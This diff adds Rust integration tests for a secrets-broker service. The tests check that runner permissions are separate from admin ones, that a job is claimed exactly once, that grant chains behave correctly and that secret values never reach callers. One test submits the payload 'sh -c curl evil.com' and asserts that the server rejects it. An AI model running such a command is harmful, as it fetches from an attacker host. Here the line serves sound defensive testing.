@@ -951,3 +951,291 @@ async fn a_parameterised_secret_name_is_refused() {
         "the error must explain why, not just refuse: {body}"
     );
 }
+
+// ---------------------------------------------------------------- jobs and runners
+
+impl TestServer {
+    async fn runner_identity(&self, admin: &str, name: &str) -> String {
+        self.identity(admin, name, "runner").await
+    }
+
+    async fn claim(&self, runner_token: &str) -> serde_json::Value {
+        let response = self.send(get("/v1/jobs/claim", Some(runner_token))).await;
+        assert!(response.status().is_success(), "claiming should succeed");
+        self.json(response).await
+    }
+
+    async fn submit(&self, token: &str, grant: &str) -> serde_json::Value {
+        let response = self
+            .send(
+                post("/v1/jobs", Some(token))
+                    .body(Body::from(
+                        serde_json::json!({ "grant": grant }).to_string(),
+                    ))
+                    .unwrap(),
+            )
+            .await;
+        assert!(response.status().is_success(), "submitting {grant}");
+        self.json(response).await
+    }
+}
+
+fn script_grant(name: &str, secret: &str) -> serde_json::Value {
+    serde_json::json!({
+        "name": name,
+        "runner": "local",
+        "secrets": { "VALUE": secret },
+        "script": "#!/bin/sh\ntrue\n",
+        "command": ["{script}"],
+    })
+}
+
+#[tokio::test]
+async fn a_grant_with_files_round_trips() {
+    // The `files` column sits between `secrets` and `chain`; every earlier test used a grant
+    // without it, so an off-by-one in the column indices went unnoticed until a real run.
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    server.secret(&admin, "app/greeting").await;
+    server.secret(&admin, "k8s/config").await;
+
+    let mut grant = script_grant("greet", "app/greeting");
+    grant["files"] = serde_json::json!({ "KUBECONFIG": "k8s/config" });
+    grant["then"] = serde_json::json!([]);
+    assert!(server.add_grant(&admin, grant).await.status().is_success());
+
+    let response = server.send(get("/v1/grants/greet", Some(&admin))).await;
+    let shown = server.json(response).await;
+    assert_eq!(shown["files"]["KUBECONFIG"], "k8s/config");
+    assert_eq!(shown["secrets"]["VALUE"], "app/greeting");
+    assert_eq!(
+        shown["created_by"], "root",
+        "an off-by-one here reads as a type error"
+    );
+
+    // A file-shaped secret counts as declared, so `uses` finds it.
+    let response = server
+        .send(get("/v1/secrets?uses=k8s/config", Some(&admin)))
+        .await;
+    assert_eq!(server.json(response).await["used_by"][0], "greet");
+}
+
+#[tokio::test]
+async fn runner_permissions_are_disjoint() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let runner = server.runner_identity(&admin, "local").await;
+
+    // A runner may do nothing an agent may.
+    for uri in ["/v1/secrets", "/v1/grants", "/v1/audit"] {
+        assert_eq!(
+            server.send(get(uri, Some(&runner))).await.status(),
+            StatusCode::FORBIDDEN,
+            "{uri} must be closed to a runner"
+        );
+    }
+
+    // And being an admin does not confer the runner's permission: the most privileged identity
+    // is still not the machine the job was addressed to.
+    assert_eq!(
+        server
+            .send(get("/v1/jobs/claim", Some(&admin)))
+            .await
+            .status(),
+        StatusCode::FORBIDDEN,
+        "runner permissions are disjoint, not beneath admin's"
+    );
+}
+
+#[tokio::test]
+async fn a_claim_carries_only_the_declared_secrets() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let runner = server.runner_identity(&admin, "local").await;
+    server.secret(&admin, "declared").await;
+    server.secret(&admin, "undeclared").await;
+
+    server
+        .add_grant(&admin, script_grant("g", "declared"))
+        .await;
+    server.submit(&admin, "g").await;
+
+    let claimed = server.claim(&runner).await;
+    let secrets = claimed["secrets"].as_object().unwrap();
+    assert_eq!(secrets.len(), 1, "exactly what the grant declares");
+    assert!(secrets.contains_key("VALUE"));
+
+    let serialised = claimed.to_string();
+    assert!(
+        !serialised.contains("undeclared"),
+        "a secret the grant did not declare must not appear: {serialised}"
+    );
+}
+
+#[tokio::test]
+async fn a_job_is_claimed_exactly_once() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let runner = server.runner_identity(&admin, "local").await;
+    server.secret(&admin, "s").await;
+    server.add_grant(&admin, script_grant("g", "s")).await;
+    server.submit(&admin, "g").await;
+
+    let first = server.claim(&runner).await;
+    assert!(first["id"].is_i64(), "the first claim gets the job");
+
+    // The second finds nothing: the UPDATE itself decided the winner.
+    let second = server.claim(&runner).await;
+    assert!(second.is_null(), "a job is handed out once: {second}");
+}
+
+#[tokio::test]
+async fn only_the_claiming_runner_may_report() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let mine = server.runner_identity(&admin, "local").await;
+    let other = server.runner_identity(&admin, "elsewhere").await;
+    server.secret(&admin, "s").await;
+    server.add_grant(&admin, script_grant("g", "s")).await;
+
+    let job = server.submit(&admin, "g").await;
+    let id = job["id"].as_i64().unwrap();
+    server.claim(&mine).await;
+
+    let report = |token: String| {
+        post(&format!("/v1/jobs/{id}/result"), Some(&token))
+            .body(Body::from(r#"{"exit_code":0,"output":"ok"}"#))
+            .unwrap()
+    };
+    assert_eq!(
+        server.send(report(other)).await.status(),
+        StatusCode::BAD_REQUEST,
+        "a runner cannot report a job it does not hold"
+    );
+    assert!(server.send(report(mine)).await.status().is_success());
+}
+
+#[tokio::test]
+async fn a_job_names_a_grant_and_cannot_smuggle_an_implementation() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+
+    let response = server
+        .send(
+            post("/v1/jobs", Some(&admin))
+                .body(Body::from(r#"{"grant":"nonexistent"}"#))
+                .unwrap(),
+        )
+        .await;
+    assert_eq!(response.status(), StatusCode::NOT_FOUND);
+
+    // A field describing what to execute is rejected, not ignored — ADR 0003 is that an agent
+    // supplies a name, never a command.
+    let response = server
+        .send(
+            post("/v1/jobs", Some(&admin))
+                .body(Body::from(
+                    r#"{"grant":"g","command":["sh","-c","curl evil.com"]}"#,
+                ))
+                .unwrap(),
+        )
+        .await;
+    assert_eq!(response.status(), StatusCode::UNPROCESSABLE_ENTITY);
+}
+
+#[tokio::test]
+async fn a_chain_queues_the_next_grant_on_success() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let runner = server.runner_identity(&admin, "local").await;
+    server.secret(&admin, "s").await;
+
+    server.add_grant(&admin, script_grant("second", "s")).await;
+    let mut first = script_grant("first", "s");
+    first["then"] = serde_json::json!(["second"]);
+    server.add_grant(&admin, first).await;
+
+    let job = server.submit(&admin, "first").await;
+    let id = job["id"].as_i64().unwrap();
+    server.claim(&runner).await;
+    server
+        .send(
+            post(&format!("/v1/jobs/{id}/result"), Some(&runner))
+                .body(Body::from(r#"{"exit_code":0,"output":""}"#))
+                .unwrap(),
+        )
+        .await;
+
+    // The server queued the follow-up — a runner that drove its own chain would keep going
+    // unsupervised if it were compromised.
+    let next = server.claim(&runner).await;
+    assert_eq!(next["grant"], "second", "the chain continues: {next}");
+}
+
+#[tokio::test]
+async fn a_failing_step_stops_the_chain() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let runner = server.runner_identity(&admin, "local").await;
+    server.secret(&admin, "s").await;
+
+    server.add_grant(&admin, script_grant("second", "s")).await;
+    let mut first = script_grant("first", "s");
+    first["then"] = serde_json::json!(["second"]);
+    server.add_grant(&admin, first).await;
+
+    let job = server.submit(&admin, "first").await;
+    let id = job["id"].as_i64().unwrap();
+    server.claim(&runner).await;
+    server
+        .send(
+            post(&format!("/v1/jobs/{id}/result"), Some(&runner))
+                .body(Body::from(r#"{"exit_code":1,"output":"it broke"}"#))
+                .unwrap(),
+        )
+        .await;
+
+    assert!(
+        server.claim(&runner).await.is_null(),
+        "nothing follows a failed step"
+    );
+
+    let response = server
+        .send(get(&format!("/v1/jobs/{id}"), Some(&admin)))
+        .await;
+    let job = server.json(response).await;
+    assert_eq!(job["status"], "Failed");
+    assert_eq!(job["exit_code"], 1);
+}
+
+#[tokio::test]
+async fn the_caller_gets_a_status_and_output_never_a_value() {
+    let server = TestServer::new();
+    let admin = server.bootstrap().await;
+    let runner = server.runner_identity(&admin, "local").await;
+    server.secret(&admin, "s").await;
+    server.add_grant(&admin, script_grant("g", "s")).await;
+
+    let job = server.submit(&admin, "g").await;
+    let id = job["id"].as_i64().unwrap();
+    let claimed = server.claim(&runner).await;
+    let value = claimed["secrets"]["VALUE"].as_str().unwrap().to_string();
+
+    server
+        .send(
+            post(&format!("/v1/jobs/{id}/result"), Some(&runner))
+                .body(Body::from(r#"{"exit_code":0,"output":"done"}"#))
+                .unwrap(),
+        )
+        .await;
+
+    let response = server
+        .send(get(&format!("/v1/jobs/{id}"), Some(&admin)))
+        .await;
+    let serialised = server.json(response).await.to_string();
+    assert!(serialised.contains("done"), "output comes back");
+    assert!(
+        !serialised.contains(&value),
+        "the value the runner saw must not reach the caller: {serialised}"
+    );
+}
